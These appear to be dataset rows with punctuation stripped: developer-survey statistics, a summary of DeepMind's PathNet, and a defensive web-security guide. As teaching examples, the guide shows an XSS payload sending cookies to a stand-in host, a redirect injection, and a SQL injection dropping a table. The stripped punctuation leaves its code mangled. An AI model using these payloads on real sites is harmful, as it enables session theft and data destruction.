17 years 2 0  17 to 18 years 1 7  18 to 19 years 1 3  19 to 20 years 2 0  20 or more years 17 2   51 145 responses  among respondents who indicated they no longer program as part of their job  Respondents who indicated that they had worked as professional developers in the past  but now did something else for a living  were asked how long they had coded as part of their jobs   Male 88 6  Female 7 6  Other 1 2  Gender non conforming 0 9  Transgender 0 5   35 990 responses  We asked respondents for their gender identity  Specifically  we asked them to select each of the following options that apply to them   Male  Female  Transgender  Non binary  genderqueer  or gender non conforming  A different identity  write in option   According to Quantcast  women account for 10  of Stack Overflow s U S  traffic  Similarly  10  of survey respondents from the U S  identify as women  In our survey last year  6 6  of respondents from the U S  identified as women   Meanwhile  women account for 9  of Stack Overflow s UK traffic  while 7 3  of survey respondents from the UK were women  Finally  women account for 8  of Stack Overflow s traffic from both France and Germany  while 5 1  and 5 6  of respondents from those countries  respectively  identify as women   We will publish additional analysis related to respondents  gender identities in the coming weeks   White or of European descent 74 4  South Asian 8 8  Hispanic or Latino Latina 5 6  East Asian 4 9  Middle Eastern 3 6  I prefer not to say 2 6  Black or of African descent 2 5  I don t know 2 0  Native American  Pacific Islander  or Indigenous Australian 0 9   33 033 responses  This was the first year we asked respondents for their ethnic identity  We asked them to select each option that applied   We asked respondents this question to add an important dimension to what we can learn about developers  In addition  public policy researchers and employers frequently look to us for information on how they can reach out to and better understand underrepresented groups among developers   We will publish additional analysis related to respondents  ethnic identities in the coming weeks   None or prefer not to say 96 3  Other 1 8  Blind 1 0  Deaf 0 5  Unable to walk 0 2  Unable to type 0 1   1 755 responses identified as having a disability  Similar to our question about ethnicity  this was the first year we asked respondents for their disability status  Of the 3 4  of respondents who identified as having a disability  we asked them to select each option that applied  and we included a write in option  We know developers can experience many forms of disability  For this survey  we confined our list of standard options on this question to disabilities that require some physical accommodation by employers   We will publish additional analysis related to respondents  disability status in the coming weeks   A bachelor s degree 29 1  A master s degree 21 6  High school 16 8  Some college university study  no bachelor s degree 13 7  A doctoral degree 5 9  A professional degree 4 4  Primary elementary school 3 9  I don t know not sure 2 1  I prefer not to answer 1 8  No education 0 6   34 938 responses  We asked respondents   What is the highest level of education received by either of your parents   Similar to ethnicity and disability status  this is the first year we asked this question  We asked this question in part because public policy researchers and some employers seek information about first generation college students to improve their efforts to support them   We will publish additional analysis on this in the coming weeks   The dashed line shows the average ratio of men s to women s participation  While the sample as a whole skewed heavily male  women were more likely to be represented in some developer roles than others  They were proportionally more represented among data scientists  mobile and web developers  quality assurance engineers  and graphic designers  The dashed line shows the average ratio for all of these developer roles   Web developer 72 4  Desktop applications developer 30 8  Mobile developer 20 1  Database administrator 14 5  DevOps specialist 12 4  Systems administrator 12 4  Developer with a statistics or mathematics background 11 5  Embedded applications devices developer 9 7  Other 8 7  Data scientist 7 8  Graphics programming 4 9  Quality assurance engineer 3 5  Machine learning specialist 3 5  Graphic designer 3 3  18 770 responses Web developer 73 6  Mobile developer 27 8  Desktop applications developer 22 4  Developer with a statistics or mathematics background 11 7  Database administrator 11 3  DevOps specialist 8 5  Data scientist 7 4  Embedded applications devices developer 7 2  Systems administrator 7 0  Other 6 6  Graphic designer 3 8  Machine learning specialist 3 8  Quality assurance engineer 3 1  Graphics programming 2 8  2 009 responses Web developer 80 9  Desktop applications developer 29 0  Mobile developer 27 8  Database administrator 17 0  Systems administrator 14 8  DevOps specialist 11 5  Developer with a statistics or mathematics background 10 2  Data scientist 9 6  Embedded applications devices developer 8 2  Other 6 2  Graphics programming 4 7  Machine learning specialist 4 4  Graphic designer 4 2  Quality assurance engineer 4 0  1 412 responses Web developer 74 2  Mobile developer 27 7  Desktop applications developer 25 0  Database administrator 12 9  Developer with a statistics or mathematics background 11 4  DevOps specialist 10 9  Systems administrator 10 4  Data scientist 8 8  Embedded applications devices developer 7 7  Other 5 4  Machine learning specialist 4 8  Graphics programming 4 5  Graphic designer 3 9  Quality assurance engineer 3 8  1 063 responses  Respondents who identified as White or of European descent were less likely to report being a mobile developer than those who identified as South Asian  Hispanic or Latino Latina  or East Asian  A higher proportion of respondents who identified as Hispanic or Latino Latina selected  web developer  as an option compared to those who selected White or of European descent  South Asian  or East Asian   Important note  We didn t receive enough responses from developers of some ethnicities to include them here with reliable percentages  However  we do see that many developers who identify as Black or of African descent work as web developers and mobile developers  and many developers with Middle Eastern ethnic backgrounds work as web developers and desktop applications developers  Developers who identified as Native American  Pacific Islander  or Indigenous Australian work as web developers at a high rate   Less than a year 10 7   6 0  1 to 2 years 16 6   11 3  2 to 3 years 14 0   10 8  3 to 4 years 9 7   9 5  4 to 5 years 8 6   8 1  5 to 6 years 6 6   7 5  6 to 7 years 4 7   4 8  7 to 8 years 3 6   4 4  8 to 9 years 2 2   3 4  9 to 10 years 3 7   5 0  10 to 11 years 3 9   4 3  11 to 12 years 1 6   2 3  12 to 13 years 1 4   2 0  13 to 14 years 0 6   1 5  14 to 15 years 1 2   2 2  15 to 16 years 1 5   2 4  16 to 17 years 1 2   2 0  17 to 18 years 1 2   1 6  18 to 19 years 1 1   1 1  19 to 20 years 0 6   1 2  20 or more years 5 4   8 7  Female Male 29 255 responses White or of European descent 12 5 Native American  Pacific Islander  or Indigenous Australian 12 1 I prefer not to say 11 5 Hispanic or Latino Latina 10 6 Middle Eastern 9 6 East Asian 9 2 Black or of African descent 8 8 I don t know 8 3 South Asian 8 0 Mean of 33 004 responses  Between respondents who identified as men or women  nearly twice the number of women said they had been coding for less than a year  On average  respondents who identified as White or of European descent and those who identified as Pacific Islander or Indigenous Australian had the highest average number of years experience coding   icons  1  Education  I never completed any formal education 0 8  Primary elementary school 2 0  Secondary school 11 5  Some college university study without earning a bachelor s degree 15 8  Bachelor s degree 42 0  Master s degree 21 7  Professional degree 1 4  Doctoral degree 2 5  I prefer not to answer 2 2   51 392 responses  Among current professional developers globally  76 5  of respondents said they had a bachelor s degree or higher  such as a Master s degree or equivalent   Computer science or software engineering 50 0  Computer engineering or electrical electronics engineering 10 2  Computer programming or Web development 9 1  Information technology  networking  or system administration 5 0  A natural science 4 4  A non computer focused engineering discipline 4 2  Mathematics or statistics 3 8  Something else 2 5  A humanities discipline 2 1  A business discipline 2 1  Management information systems 1 5  Fine arts or performing arts 1 5  A social science 1 5  I never declared a major 1 4  Psychology 0 5  A health science 0 3   42 841 responses  select all that apply  More than half  54 2   of professional developers who had studied at a college or university said they had concentrated their studies on computer science or software engineering  and an additional quarter  24 9   majored in a closely related discipline such as computer programming  computer engineering  or information technology  The remaining 20 9  said they had majored in other fields such as business  the social sciences  natural sciences  non computer engineering  or the arts   Among current students who responded to the survey  48 3  said they were majoring in computer science or software engineering  and 30 5  said they were majoring in closely related fields  Finally  21 2  said they were focusing on other fields   Very important 15 9  Important 25 1  Somewhat important 26 9  Not very important 20 5  Not at all important 11 5   23 355 responses  Of current professional developers  32  said their formal education was not very important or not important at all to their career success  This is not entirely surprising given that 90  of developers overall consider themselves at least somewhat self taught  a formal degree is only one aspect of their education  and so much of their practical day to day work depends on their company s individual tech stack decisions   However  computer science majors and computer engineering majors were the most likely  49 4   to say their formal education was important or very important   Compared to computer science majors  respondents who majored in less theoretical computer related disciplines  such as IT  web development  or computer programming  were more likely to say their formal educations were unimportant   Self taught 90 0  Online course 45 4  On the job training 41 2  Open source contributions 37 0  Hackathon 23 6  Coding competition 22 0  Part time evening course 15 3  Industry certification 14 7  Bootcamp 9 0   30 354 responses  select all that apply  Developers love to learn  90  say they are at least partially self taught  Among current professional developers  55 9  say they ve taken an online course  and 53 4  say they ve received on the job training   Official documentation 80 2  Stack Overflow Q A 80 1  Trade book 53 8  Non Stack online communities 50 7  Built in help 47 1  Stack Overflow Docs 27 5  Textbook 20 8  Friends network 20 7  Company internal community 18 5  Other 11 7  Tutoring mentoring 4 4   26 735 responses  select all that apply  By far  reading official documentation and using Stack Overflow Q A are the two most common ways developers level up their skills   I already had a job as a developer when I started the program 45 8  I got a job as a developer before completing the program 9 7  Immediately upon graduating 11 3  Less than a month 6 0  One to three months 8 8  Four to six months 4 0  Six months to a year 3 0  Longer than a year 3 3  I haven t gotten a job as a developer yet 8 1   2 602 responses  Due to the high demand for professional developers  coding bootcamps have exploded in popularity in the past few years  Although commonly perceived as a way for non developers to transition into a new career  we found that 45 8  of those who said they d gone through a bootcamp were already developers when they started the program  This is likely because many developers decide at various parts in their career that they need to upgrade their skills or learn new technologies to stay relevant in the job market   Yes  I program as a hobby 48 3  Yes  I contribute to open source projects 5 9  Yes  both 26 8  No 19 0   51 392 responses  Coding isn t just a career  it can be a passion  Among all developers  75 0  code as a hobby  even among professional developers a similar proportion  73 9   do so  Additionally  32 7  of developers said they contribute to open source projects   Take online courses 64 7  Buy books and work through the exercises 49 9  Part time evening courses 31 9  Contribute to open source 31 5  Bootcamp 22 4  Conferences meet ups 22 3  Return to college 21 3  Participate in online coding competitions 15 3  Get a job as a QA tester 14 3  Participate in hackathons 11 7  Master s degree 11 2  Other 10 0  None of these 2 6   23 568 responses  select all that apply  Want to learn to code but don t know where to start  More developers say you should take an online course than any other method  followed by getting a book and working through the exercises   As an important side note  we received great feedback on how we phrased this question  specifically the option   Get a job as a QA tester and work your way into a developer role   Although some developers start their careers as QA testers  the phrasing made it sound as if we saw QA as just a stepping stone  rather than a vital function and career option  QA professionals are our heroes  and QA engineers are 3 5  of our respondents this year    and we apologize for not more carefully crafting our language 
54,engineering,DeepMind just published a mind blowing paperPathNet is composed of layers of modules  Each module is a Neural Network of any type  it could be convolutional  recurrent  feedforward and whatnot   DeepMind is on the path of solving this with PathNet  PathNet is a network of neural networks  trained using both stochastic gradient descent and a genetic selection method   Since scientists started building and training neural networks  Transfer Learning has been the main bottleneck  Transfer Learning is the ability of an AI to learn from different tasks and apply its pre learned knowledge to a completely new task  It is implicit that with this precedent knowledge  the AI will perform better and train faster than de novo neural networks on the new task   Each of those nine boxes is the PathNet at a different iteration  In this case  PathNet was trained on two different games using a Advantage Actor critic or A3C  Although Pong and Alien seem very different at first  we observe a positive transfer learning using PathNet  take a look at the score graph    How does it train  First of all  we need to define the modules  Let L be the number of layers and N be the maximum number of modules per layer  the paper indicates that N is typically 3 or 4   The last layer is dense and not shared between the different tasks  Using A3c  this last layer represents the value function and policy evaluation   After defining those modules  P genotypes   pathways  are generated in the network  Due to the asynchronous nature of A3c  multiple workers are spawned to evaluate each genotype  After T episodes  a worker selects a couple of other pathways to compare to  if any of those pathways have a better fitness  it adopts it and continues training with that new pathway  If not  the worker continues evaluating the fitness of its pathway   Pathways are trained using stochastic gradient descent with back propagation throughout a single path at a time  This guarantees a manageable training time   Transfer learning  After learning a task  the network fixes all parameters on the optimal path  All other parameters must be reinitialized  otherwise PathNet will perform poorly on a new task   Using A3C  the optimal path of the previous task is not modified by the back propagation pass on the PathNet for a new task  This can be viewed as a safety net to not erase previous knowledge  Results
55,engineering,The Basics of Web Application SecurityModern web development has many challenges  and of those security is both very important and often under emphasized  While such techniques as threat analysis are increasingly recognized as essential to any serious development  there are also some basic practices which every developer can and should be doing as a matter of course   Daniel Somerfield is a Technical Lead at ThoughtWorks  where he works with customers building systems that serve their business needs and are fast  flexible  and secure  Daniel is an advocate for immutable infrastructure and cloud automation as a vehicle to advance the state of secure agile delivery at ThoughtWorks and in the industry at large   Cade Cairns is a software developer with a passion for security  He has experience leading teams creating everything from enterprise applications to security testing software  mobile applications  and software for embedded devices  At the moment his primary focus is on helping improve how security concerns are addressed during the solution delivery lifecycle   The modern software developer has to be something of a swiss army knife  Of course  you need to write code that fulfills customer functional requirements  It needs to be fast  Further you are expected to write this code to be comprehensible and extensible  sufficiently flexible to allow for the evolutionary nature of IT demands  but stable and reliable  You need to be able to lay out a useable interface  optimize a database  and often set up and maintain a delivery pipeline  You need to be able to get these things done by yesterday   Somewhere  way down at the bottom of the list of requirements  behind  fast  cheap  and flexible is  secure   That is  until something goes wrong  until the system you build is compromised  then suddenly security is  and always was  the most important thing   Security is a cross functional concern a bit like Performance  And a bit unlike Performance  Like Performance  our business owners often know they need Security  but aren t always sure how to quantify it  Unlike Performance  they often don t know  secure enough  when they see it   So how can a developer work in a world of vague security requirements and unknown threats  Advocating for defining those requirements and identifying those threats is a worthy exercise  but one that takes time and therefore money  Much of the time developers will operate in absence of specific security requirements and while their organization grapples with finding ways to introduce security concerns into the requirements intake processes  they will still build systems and write code   In this Evolving Publication  we will   point out common areas in a web application that developers need to be particularly conscious of security risks  provide guidance for how to address each risk on common web stacks  highlight common mistakes developers make  and how to avoid them  Security is a massive topic  even if we reduce the scope to only browser based web applications  These articles will be closer to a  best of  than a comprehensive catalog of everything you need to know  but we hope it will provide a directed first step for developers who are trying to ramp up fast   Trust Before jumping into the nuts and bolts of input and output  it s worth mentioning one of the most crucial underlying principles of security  trust  We have to ask ourselves  do we trust the integrity of request coming in from the user s browser   hint  we don t   Do we trust that upstream services have done the work to make our data clean and safe   hint  nope   Do we trust the connection between the user s browser and our application cannot be tampered   hint  not completely      Do we trust that the services and data stores we depend on   hint  we might     Of course  like security  trust is not binary  and we need to assess our risk tolerance  the criticality of our data  and how much we need to invest to feel comfortable with how we have managed our risk  In order to do that in a disciplined way  we probably need to go through threat and risk modeling processes  but that s a complicated topic to be addressed in another article  For now  suffice it to say that we will identify a series of risks to our system  and now that they are identified  we will have to address the threats that arise   Reject Unexpected Form Input HTML forms can create the illusion of controlling input  The form markup author might believe that because they are restricting the types of values that a user can enter in the form the data will conform to those restrictions  But rest assured  it is no more than an illusion  Even client side JavaScript form validation provides absolutely no value from a security perspective  Untrusted Input On our scale of trust  data coming from the user s browser  whether we are providing the form or not  and regardless of whether the connection is HTTPS protected  is effectively zero  The user could very easily modify the markup before sending it  or use a command line application like curl to submit unexpected data  Or a perfectly innocent user could be unwittingly submitting a modified version of a form from a hostile website  Same Origin Policy doesn t prevent a hostile site from submitting to your form handling endpoint  In order to ensure the integrity of incoming data  validation needs to be handled on the server  But why is malformed data a security concern  Depending on your application logic and use of output encoding  you are inviting the possibility of unexpected behavior  leaking data  and even providing an attacker with a way of breaking the boundaries of input data into executable code  For example  imagine that we have a form with a radio button that allows the user to select a communication preference  Our form handling code has application logic with different behavior depending on those values  final String communicationType   req getParameter  communicationType    if   email  equals communicationType     sendByEmail      else if   text  equals communicationType     sendByText      else   sendError resp  format  Can t send by type  s   communicationType      This code may or may not be dangerous  depending on how the sendError method is implemented  We are trusting that downstream logic processes untrusted content correctly  It might  But it might not  We re much better off if we can eliminate the possibility of unanticipated control flow entirely  So what can a developer do to minimize the danger that untrusted input will have undesirable effects in application code  Enter input validation  Input Validation Input validation is the process of ensuring input data is consistent with application expectations  Data that falls outside of an expected set of values can cause our application to yield unexpected results  for example violating business logic  triggering faults  and even allowing an attacker to take control of resources or the application itself  Input that is evaluated on the server as executable code  such as a database query  or executed on the client as HTML JavaScript is particularly dangerous  Validating input is an important first line of defense to protect against this risk  Developers often build applications with at least some basic input validation  for example to ensure a value is non null or an integer is positive  Thinking about how to further limit input to only logically acceptable values is the next step toward reducing risk of attack  Input validation is more effective for inputs that can be restricted to a small set  Numeric types can typically be restricted to values within a specific range  For example  it doesn t make sense for a user to request to transfer a negative amount of money or to add several thousand items to their shopping cart  This strategy of limiting input to known acceptable types is known as positive validation or whitelisting  A whitelist could restrict to a string of a specific form such as a URL or a date of the form  yyyy mm dd   It could limit input length  a single acceptable character encoding  or  for the example above  only values that are available in your form  Another way of thinking of input validation is that it is enforcement of the contract your form handling code has with its consumer  Anything violating that contract is invalid and therefore rejected  The more restrictive your contract  the more aggressively it is enforced  the less likely your application is to fall prey to security vulnerabilities that arise from unanticipated conditions  You are going to have to make a choice about exactly what to do when input fails validation  The most restrictive and  arguably most desirable is to reject it entirely  without feedback  and make sure the incident is noted through logging or monitoring  But why without feedback  Should we provide our user with information about why the data is invalid  It depends a bit on your contract  In form example above  if you receive any value other than  email  or  text   something funny is going on  you either have a bug or you are being attacked  Further  the feedback mechanism might provide the point of attack  Imagine the sendError method writes the text back to the screen as an error message like  We re unable to respond with communicationType    That s all fine if the communicationType is  carrier pigeon  but what happens if it looks like this   script new Image   src    http   evil martinfowler com steal     document cookie  script  You ve now faced with the possibility of a reflective XSS attack that steals session cookies  If you must provide user feedback  you are best served with a canned response that doesn t echo back untrusted user data  for example  You must choose email or text   If you really can t avoid rendering the user s input back at them  make absolutely sure it s properly encoded  see below for details on output encoding   In Practice It might be tempting to try filtering the  script  tag to thwart this attack  Rejecting input that contains known dangerous values is a strategy referred to as negative validation or blacklisting  The trouble with this approach is that the number of possible bad inputs is extremely large  Maintaining a complete list of potentially dangerous input would be a costly and time consuming endeavor  It would also need to be continually maintained  But sometimes it s your only option  for example in cases of free form input  If you must blacklist  be very careful to cover all your cases  write good tests  be as restrictive as you can  and reference OWASP s XSS Filter Evasion Cheat Sheet to learn common methods attackers will use to circumvent your protections  Resist the temptation to filter out invalid input  This is a practice commonly called  sanitization   It is essentially a blacklist that removes undesirable input rather than rejecting it  Like other blacklists  it is hard to get right and provides the attacker with more opportunities to evade it  For example  imagine  in the case above  you choose to filter out  script  tags  An attacker could bypass it with something as simple as   scr script ipt  Even though your blacklist caught the attack  by fixing it  you just reintroduced the vulnerability  Input validation functionality is built in to most modern frameworks and  when absent  can also be found in external libraries that enable the developer to put multiple constraints to be applied as rules on a per field basis  Built in validation of common patterns like email addresses and credit card numbers is a helpful bonus  Using your web framework s validation provides the additional advantage of pushing the validation logic to the very edge of the web tier  causing invalid data to be rejected before it ever reaches complex application code where critical mistakes are easier to make  Framework Approaches Java Hibernate  Bean Validation  ESAPI Spring Built in type safe params in Controller Built in Validator interface  Bean Validation  Ruby on Rails Built in Active Record Validators ASP NET Built in Validation  see BaseValidator  Play Built in Validator Generic JavaScript xss filters NodeJS validator js General Regex based validation on application inputs In Summary White list when you can  Black list when you can t whitelist  Keep your contract as restrictive as possible  Make sure you alert about the possible attack  Avoid reflecting input back to a user  Reject the web content before it gets deeper into application logic to minimize ways to mishandle untrusted data or  even better  use your web framework to whitelist input Although this section focused on using input validation as a mechanism for protecting your form handling code  any code that handles input from an untrusted source can be validated in much the same way  whether the message is JSON  XML  or any other format  and regardless of whether it s a cookie  a header  or URL parameter string  Remember  if you don t control it  you can t trust it  If it violates the contract  reject it   Encode HTML Output In addition to limiting data coming into an application  web application developers need to pay close attention to the data as it comes out  A modern web application usually has basic HTML markup for document structure  CSS for document style  JavaScript for application logic  and user generated content which can be any of these things  It s all text  And it s often all rendered to the same document  An HTML document is really a collection of nested execution contexts separated by tags  like  script  or  style    The developer is always one errant angle bracket away from running in a very different execution context than they intend  This is further complicated when you have additional context specific content embedded within an execution context  For example  both HTML and JavaScript can contain a URL  each with rules all their own  Output Risks HTML is a very  very permissive format  Browsers try their best to render the content  even if it is malformed  That may seem beneficial to the developer since a bad bracket doesn t just explode in an error  however  the rendering of badly formed markup is a major source of vulnerabilities  Attackers have the luxury of injecting content into your pages to break through execution contexts  without even having to worry about whether the page is valid  Handling output correctly isn t strictly a security concern  Applications rendering data from sources like databases and upstream services need to ensure that the content doesn t break the application  but risk becomes particularly high when rendering content from an untrusted source  As mentioned in the prior section  developers should be rejecting input that falls outside the bounds of the contract  but what do we do when we need to accept input containing characters that has the potential to change our code  like a single quote         or open bracket          This is where output encoding comes in  Output Encoding Output encoding is converting outgoing data to a final output format  The complication with output encoding is that you need a different codec depending on how the outgoing data is going to be consumed  Without appropriate output encoding  an application could provide its client with misformatted data making it unusable  or even worse  dangerous  An attacker who stumbles across insufficient or inappropriate encoding knows that they have a potential vulnerability that might allow them to fundamentally alter the structure of the output from the intent of the developer  For example  imagine that one of the first customers of a system is the former supreme court judge Sandra Day O Connor  What happens if her name is rendered into HTML   p The Honorable Justice Sandra Day O Connor  p  renders as  The Honorable Justice Sandra Day O Connor All is right with the world  The page is generated as we would expect  But this could be a fancy dynamic UI with a model view controller architecture  These strings are going to show up in JavaScript  too  What happens when the page outputs this to the browser  document getElementById  name   innerText    Sandra Day O Connor       unescaped string The result is malformed JavaScript  This is what hackers look for to break through execution context and turn innocent data into dangerous executable code  If the Chief Justice enters her name as Sandra Day O  window location  http   evil martinfowler com    suddenly our user has been pushed to a hostile site  If  however  we correctly encode the output for a JavaScript context  the text will look like this   Sandra Day O   window location   http   evil martinfowler com      A bit confusing  perhaps  but a perfectly harmless  non executable string  Note There are a couple strategies for encoding JavaScript  This particular encoding uses escape sequences to represent the apostrophe           but it could also be represented safely with the Unicode escape seqeence          The good news is that most modern web frameworks have mechanisms for rendering content safely and escaping reserved characters  The bad news is that most of these frameworks include a mechanism for circumventing this protection and developers often use them either due to ignorance or because they are relying on them to render executable code that they believe to be safe  Cautions and Caveats There are so many tools and frameworks these days  and so many encoding contexts  e g  HTML  XML  JavaScript  PDF  CSS  SQL  etc    that creating a comprehensive list is infeasible  however  below is a starter for what to use and avoid for encoding HTML in some common frameworks  If you are using another framework  check the documentation for safe output encoding functions  If the framework doesn t have them  consider changing frameworks to something that does  or you ll have the unenviable task of creating output encoding code on your own  Also note  that just because a framework renders HTML safely  doesn t mean it s going to render JavaScript or PDFs safely  You need to be aware of the encoding a particular context the encoding tool is written for  Be warned  you might be tempted to take the raw user input  and do the encoding before storing it  This pattern will generally bite you later on  If you were to encode the text as HTML prior to storage  you can run into problems if you need to render the data in another format  it can force you to unencode the HTML  and re encode into the new output format  This adds a great deal of complexity and encourages developers to write code in their application code to unescape the content  making all the tricky upstream output encoding effectively useless  You are much better off storing the data in its most raw form  then handling encoding at rendering time  Finally  it s worth noting that nested rendering contexts add an enormous amount of complexity and should be avoided whenever possible  It s hard enough to get a single output string right  but when you are rendering a URL  in HTML within JavaScript  you have three contexts to worry about for a single string  If you absolutely cannot avoid nested contexts  make sure to de compose the problem into separate stages  thoroughly test each one  paying special attention to order of rendering  OWASP provides some guidance for this situation in the DOM based XSS Prevention Cheat Sheet In Summary Output encode all application data on output with an appropriate codec  Use your framework s output encoding capability  if available  Avoid nested rendering contexts as much as possible  Store your data in raw form and encode at rendering time  Avoid unsafe framework and JavaScript calls that avoid encoding  Bind Parameters for Database Queries Whether you are writing SQL against a relational database  using an object relational mapping framework  or querying a NoSQL database  you probably need to worry about how input data is used within your queries  The database is often the most crucial part of any web application since it contains state that can t be easily restored  It can contain crucial and sensitive customer information that must be protected  It is the data that drives the application and runs the business  So you would expect developers to take the most care when interacting with their database  and yet injection into the database tier continues to plague the modern web application even though it s relatively easy to prevent  Little Bobby Tables No discussion of parameter binding would be complete without including the famous 2007  Little Bobby Tables  issue of xkcd  To decompose this comic  imagine the system responsible for keeping track of grades has a function for adding new students  void addStudent String lastName  String firstName    String query    INSERT INTO students  last_name  first_name  VALUES       lastName            firstName         getConnection   createStatement   execute query     If addStudent is called with parameters  Fowler    Martin   the resulting SQL is  INSERT INTO students  last_name  first_name  VALUES   Fowler    Martin   But with Little Bobby s name the following SQL is executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert    DROP TABLE Students       In fact  two commands are executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert   DROP TABLE Students The final      comments out the remainder of the original query  ensuring the SQL syntax is valid  Et voila  the DROP is executed  This attack vector allows the user to execute arbitrary SQL within the context of the application s database user  In other words  the attacker can do anything the application can do and more  which could result in attacks that cause greater harm than a DROP  including violating data integrity  exposing sensitive information or inserting executable code  Later we will talk about defining different users as a secondary defense against this kind of mistake  but for now  suffice to say that there is a very simple application level strategy for minimizing injection risk  Parameter Binding to the Rescue To quibble with Hacker Mom s solution  sanitizing is very difficult to get right  creates new potential attack vectors and is certainly not the right approach  Your best  and arguably only decent option is parameter binding  JDBC  for example  provides the PreparedStatement setXXX   methods for this very purpose  Parameter binding provides a means of separating executable code  such as SQL  from content  transparently handling content encoding and escaping  void addStudent String lastName  String firstName    PreparedStatement stmt   getConnection   prepareStatement  INSERT INTO students  last_name  first_name  VALUES           stmt setString 1  lastName   stmt setString 2  firstName   stmt execute      Any full featured data access layer will have the ability to bind variables and defer implementation to the underlying protocol  This way  the developer doesn t need to understand the complexities that arise from mixing user input with executable code  For this to be effective all untrusted inputs need to be bound  If SQL is built through concatenation  interpolation  or formatting methods  none of the resulting string should be created from user input  Clean and Safe Code Sometimes we encounter situations where there is tension between good security and clean code  Security sometimes requires the programmer to add some complexity in order to protect the application  In this case however  we have one of those fortuitous situations where good security and good design are aligned  In addition to protecting the application from injection  introducing bound parameters improves comprehensibility by providing clear boundaries between code and content  and simplifies creating valid SQL by eliminating the need to manage the quotes by hand  As you introduce parameter binding to replace your string formatting or concatenation  you may also find opportunities to introduce generalized binding functions to the code  further enhancing code cleanliness and security  This highlights another place where good design and good security overlap  de duplication leads to additional testability  and reduction of complexity  Common Misconceptions There is a misconception that stored procedures prevent SQL injection  but that is only true insofar as parameters are bound inside the stored procedure  If the stored procedure itself does string concatenation it can be injectable as well  and binding the variable from the client won t save you  Similarly  object relational mapping frameworks like ActiveRecord  Hibernate  or  NET Entity Framework  won t protect you unless you are using binding functions  If you are building your queries using untrusted input without binding  the app still could be vulnerable to an injection attack  For more detail on the injection risks of stored procedures and ORMs  see security analyst Troy Hunt s article Stored procedures and ORMs won t save you from SQL injection   Finally  there is a misconception that NoSQL databases are not susceptible to injection attack and that is not true  All query languages  SQL or otherwise  require a clear separation between executable code and content so the execution doesn t confuse the command from the parameter  Attackers look for points in the runtime where they can break through those boundaries and use input data to change the intended execution path  Even Mongo DB  which uses a binary wire protocol and language specific API  reducing opportunities for text based injection attacks  exposes the   where  operator which is vulnerable to injection  as is demonstrated in this article from the OWASP Testing Guide  The bottom line is that you need to check the data store and driver documentation for safe ways to handle input data  Parameter Binding Functions Check the matrix below for indication of safe binding functions of your chosen data store  If it is not included in this list  check the product documentation  Framework Encoded Dangerous Raw JDBC Connection prepareStatement   used with setXXX   methods and bound parameters for all input  Any query or update method called with string concatenation rather than binding  PHP   MySQLi prepare   used with bind_param for all input  Any query or update method called with string concatenation rather than binding  MongoDB Basic CRUD operations such as find    insert    with BSON document field names controlled by application  Operations  including find  when field names are allowed to be determined by untrusted data or use of Mongo operations such as   where  that allow arbitrary JavaScript conditions  Cassandra Session prepare used with BoundStatement and bound parameters for all input  Any query or update method called with string concatenation rather than binding  Hibernate   JPA Use SQL or JPQL OQL with bound parameters via setParameter Any query or update method called with string concatenation rather than binding  ActiveRecord Condition functions  find_by  where  if used with hashes or bound parameters  eg  where  foo  bar  where   foo       bar  Condition functions used with string concatenation or interpolation  where  foo      bar     where  foo        bar        In Summary Avoid building SQL  or NoSQL equivalent  from user input  Bind all parameterized data  both queries and stored procedures  Use the native driver binding function rather than trying to handle the encoding yourself  Don t think stored procedures or ORM tools will save you  You need to use binding functions for those  too  NoSQL doesn t make you injection proof  Protect Data in Transit While we re on the subject of input and output  there s another important consideration  the privacy and integrity of data in transit  When using an ordinary HTTP connection  users are exposed to many risks arising from the fact data is transmitted in plaintext  An attacker capable of intercepting network traffic anywhere between a user s browser and a server can eavesdrop or even tamper with the data completely undetected in a man in the middle attack  There is no limit to what the attacker can do  including stealing the user s session or their personal information  injecting malicious code that will be executed by the browser in the context of the website  or altering data the user is sending to the server  We can t usually control the network our users choose to use  They very well might be using a network where anyone can easily watch their traffic  such as an open wireless network in a caf  or on an airplane  They might have unsuspectingly connected to a hostile wireless network with a name like  Free Wi Fi  set up by an attacker in a public place  They might be using an internet provider that injects content such as ads into their web traffic  or they might even be in a country where the government routinely surveils its citizens  If an attacker can eavesdrop on a user or tamper with web traffic  all bets are off  The data exchanged cannot be trusted by either side  Fortunately for us  we can protect against many of these risks with HTTPS  HTTPS and Transport Layer Security HTTPS was originally used mainly to secure sensitive web traffic such as financial transactions  but it is now common to see it used by default on many sites we use in our day to day lives such as social networking and search engines  The HTTPS protocol uses the Transport Layer Security  TLS  protocol  the successor to the Secure Sockets Layer  SSL  protocol  to secure communications  When configured and used correctly  it provides protection against eavesdropping and tampering  along with a reasonable guarantee that a website is the one we intend to be using  Or  in more technical terms  it provides confidentiality and data integrity  along with authentication of the website s identity  With the many risks we all face  it increasingly makes sense to treat all network traffic as sensitive and encrypt it  When dealing with web traffic  this is done using HTTPS  Several browser makers have announced their intent to deprecate non secure HTTP and even display visual indications to users to warn them when a site is not using HTTPS  Most HTTP 2 implementations in browsers will only support communicating over TLS  So why aren t we using it for everything now  There have been some hurdles that impeded adoption of HTTPS  For a long time  it was perceived as being too computationally expensive to use for all traffic  but with modern hardware that has not been the case for some time  The SSL protocol and early versions of the TLS protocol only support the use of one web site certificate per IP address  but that restriction was lifted in TLS with the introduction of a protocol extension called SNI  Server Name Indication   which is now supported in most browsers  The cost of obtaining a certificate from a certificate authority also deterred adoption  but the introduction of free services like Let s Encrypt has eliminated that barrier  Today there are fewer hurdles than ever before  Get a Server Certificate The ability to authenticate the identity of a website underpins the security of TLS  In the absence of the ability to verify that a site is who it says it is  an attacker capable of doing a man in the middle attack could impersonate the site and undermine any other protection the protocol provides  When using TLS  a site proves its identity using a public key certificate  This certificate contains information about the site along with a public key that is used to prove that the site is the owner of the certificate  which it does using a corresponding private key that only it knows  In some systems a client may also be required to use a certificate to prove its identity  although this is relatively rare in practice today due to complexities in managing certificates for clients  Unless the certificate for a site is known in advance  a client needs some way to verify that the certificate can be trusted  This is done based on a model of trust  In web browsers and many other applications  a trusted third party called a Certificate Authority  CA  is relied upon to verify the identity of a site and sometimes of the organization that owns it  then grant a signed certificate to the site to certify it has been verified  It isn t always necessary to involve a trusted third party if the certificate is known in advance by sharing it through some other channel  For example  a mobile app or other application might be distributed with a certificate or information about a custom CA that will be used to verify the identity of the site  This practice is referred to as certificate or public key pinning and is outside the scope of this article  The most visible indicator of security that many web browsers display is when communications with a site are secured using HTTPS and the certificate is trusted  Without it  a browser will display a warning about the certificate and prevent a user from viewing your site  so it is important to get a certificate 